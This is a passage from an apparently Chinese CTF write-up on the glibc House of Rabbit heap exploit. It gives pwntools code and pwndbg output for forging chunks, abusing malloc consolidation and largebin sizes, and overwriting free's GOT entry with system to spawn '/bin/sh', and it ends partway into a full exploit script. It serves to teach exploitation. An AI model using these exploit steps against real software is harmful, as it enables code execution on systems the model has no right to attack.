class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>触发 <code>malloc consolidation</code>  效果如下：</p>\n<p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; tel 0x6012E0 20<br>\n00:0000│  0x6012e0 (ptr) ◂— 0x7ffff6dff010<br>\n01:0008│  0x6012e8 (ptr+8) —▸ 0x602420 —▸ 0x601350 (fake+16) ◂— 0x0<br>\n02:0010│  0x6012f0 (ptr+16) —▸ 0x602420 —▸ 0x601350 (fake+16) ◂— 0x0<br>\n03:0018│  0x6012f8 (ptr+24) ◂— 0x0<br>\n… ↓     11 skipped<br>\n0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) ◂— 0x1<br>\n12:0090│  0x601370 ◂— 0x0<br>\n13:0098│  0x601378 ◂— 0x0</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; heap<br>\nAllocated chunk | PREV_INUSE<br>\nAddr: 0x602000<br>\nSize: 0x410 (with flag bits: 0x411)</p>\n<p>Free chunk (fastbins) | PREV_INUSE<br>\nAddr: 0x602410<br>\nSize: 0x20 (with flag bits: 0x21)<br>\nfd: 0x601350</p>\n<p>Top chunk | PREV_INUSE<br>\nAddr: 0x602430<br>\nSize: 0xa20bd0 (with flag bits: 0xa20bd1)</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\n0x20: 0x602410 —▸ 0x601350 (fake+16) ◂— 0x0</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; tel 0x6012E0 20<br>\n00:0000│  0x6012e0 (ptr) ◂— 0x7ffff6dff010<br>\n01:0008│  0x6012e8 (ptr+8) —▸ 0x602420 —▸ 0x601333 ◂— 0x0<br>\n… ↓     2 skipped<br>\n04:0020│  0x601300 (ptr+32) ◂— 0x0<br>\n… ↓     10 skipped<br>\n0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n12:0090│  0x601370 ◂— 0x0<br>\n13:0098│  0x601378 ◂— 0x0</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; heap<br>\nAllocated chunk | PREV_INUSE<br>\nAddr: 0x602000<br>\nSize: 0x410 (with flag bits: 0x411)</p>\n<p>Allocated chunk | PREV_INUSE<br>\nAddr: 0x602410<br>\nSize: 0xa00010 (with flag bits: 0xa00011)</p>\n<p>Top chunk | PREV_INUSE<br>\nAddr: 0x1002420<br>\nSize: 0x20be0 (with flag bits: 0x20be1)</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x601350 (fake+16) —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x601350</p>\n</blockquote>\n<p>原因：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-rabbit/image-20240726091641543.png\" alt=\"image-20240726091641543\"></p>\n<p>我们可以看见</p>\n<blockquote>\n<p>0x00:pack(0)+pack(0x00),<br>\n0x10:pack(0)+pack(0x11),<br>\n0x20:pack(0)+pack(1)</p>\n</blockquote>\n<p>fake_chunk 设置的是这样。这需要让我们了解一下 <code>malloc consolidation</code>  的过程</p>\n<blockquote>\n<ol>\n<li>从 fastbin 中依次取出 fastbin chunk</li>\n<li>对 chunk 进行简易版的 free 的 consolidation 过程</li>\n<li>向前合并</li>\n<li>向后合并</li>\n<li>插入 unsortedbin</li>\n</ol>\n<p>这里会进行向前向后合并的操作，修改 prev_inuse 标志为 1，可以使其不向上合并，但是依然会进行向下合并的检查：</p>\n<ol>\n<li>用 chunk size + chunk addr 计算出下一个 chunk 所在位置</li>\n<li>用下一个 chunk size + 其 chunk addr 计算出再下一个 chunk 所在位置，然后判断 prev_inuse 位是否是 1，不是 1 就断链合并</li>\n</ol>\n</blockquote>\n<p>所以当触发 <code>malloc consolidation</code>  时</p>\n<blockquote>\n<p>0e:0070│  0x601350 (fake+16) ◂— 0x0 ------------------------------------------------&gt;unsortedbin</p>\n<p>0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0</p>\n</blockquote>\n<h5 id=\"2准备-largebin\"><a class=\"markdownIt-Anchor\" href=\"#2准备-largebin\">#</a> <strong>2. 准备 largebin</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xa00001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x601350 (fake+16) —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x601350<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\nempty</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x601350<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0x0000000000a00001<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78<br>\n0x601370:\t0x0000000000000000\t0x0000000000000000<br>\n0x601380:\t0x0000000000000000\t0x0000000000000000<br>\n0x601390:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013a0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013b0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013c0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013d0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013e0:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nempty<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\n0x80000-∞: 0x601350 (fake+16) —▸ 0x7ffff7bc5348 (main_arena+2088) ◂— 0x601350</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x601350<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0x0000000000a00001<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5348\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350<br>\n0x601380:\t0x0000000000000000\t0x0000000000000000<br>\n0x601390:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013a0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013b0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013c0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013d0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013e0:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>其实就是 unsortbin 遍历 size，满足切割分配的切割分配，大小精确匹配就分配，大小不匹配的就根据大小装入 largebin 和 smallbin。</p>\n<h5 id=\"3申请超大内存控制指针数组\"><a class=\"markdownIt-Anchor\" href=\"#3申请超大内存控制指针数组\">#</a> <strong>3. 申请超大内存控制指针数组</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13337</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nempty<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\n0x80000-∞: 0x601350 (fake+16) —▸ 0x7ffff7bc5348 (main_arena+2088) ◂— 0x601350</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x6012e0</p>\n<p>0x6012d0:\t0x0000000000000000\t0x0000000000000000</p>\n<p>0x6012e0 <ptr>:\t0x00007ffff6dff010\t0x0000000000602420<br>\n0x6012f0 &lt;ptr+16&gt;:\t0x0000000000602420\t0x0000000000602420<br>\n0x601300 &lt;ptr+32&gt;:\t0x0000000001002430\t0x0000000000000000<br>\n0x601310 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601320 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601330:\t0x0000000000000000\t0x0000000000000000<br>\n0x601340 <fake>:\t0xfffffffffffffff0\t0x0000000000000000<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0xfffffffffffffff1<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5348\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x6012d0 —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x6012d0<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\nempty</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x6012e0</p>\n<p>0x6012d0:\t0x0000000000000000\t0x0000000000000071</p>\n<p>0x6012e0 <ptr>:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78<br>\n0x6012f0 &lt;ptr+16&gt;:\t0x0000000000602420\t0x0000000000602420<br>\n0x601300 &lt;ptr+32&gt;:\t0x0000000001002430\t0x0000000000601360<br>\n0x601310 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601320 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601330:\t0x0000000000000000\t0x0000000000000000<br>\n0x601340 <fake>:\t0x0000000000000070\t0x0000000000000000<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0xffffffffffffff81<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5335\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350</p>\n</blockquote>\n<p>可见这里无疑发生了发生了很大的变化</p>\n<p>largebin 被置入 unsortedbin 内</p>\n<p>接下来我们了解原因</p>\n<blockquote>\n<ol>\n<li>unsortedbin 处理完之后，从 largebin 中找满足大小要求的 chunk 分配，要么直接分配出去，要么切割分配出去，剩下的部分装入 unsortedbin</li>\n<li>largebin 中最大的 chunk 范围是 <code>0x80000 - ∞</code></li>\n<li><strong>从 largebin 中分配不检查申请大小是否超出系统内存</strong></li>\n</ol>\n</blockquote>\n<p>所以当我们申请超大内存时，由于我们将 largebin 的 size 置成 <code>0xfffffffffffffff1</code> ，所以等我们去申请 <code>0xFFFFFFFFFFFFFF70LL</code>  就会将剩余的 0x80 的 chunk 块放进 unsortedbin 内。</p>\n<h5 id=\"4劫持free\"><a class=\"markdownIt-Anchor\" href=\"#4劫持free\">#</a> <strong>4. 劫持 free</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这就是申请一个 0x80 的 chunk 块，并将 ptr [0] 指向 free，接下来用 edit 写入程序自带的 system 即可，最后 free 掉内容为 <code>/bin/sh</code>  的 chunk 块即可</p>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp：</h3>\n<blockquote>\n<p>脚本来源于网络</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 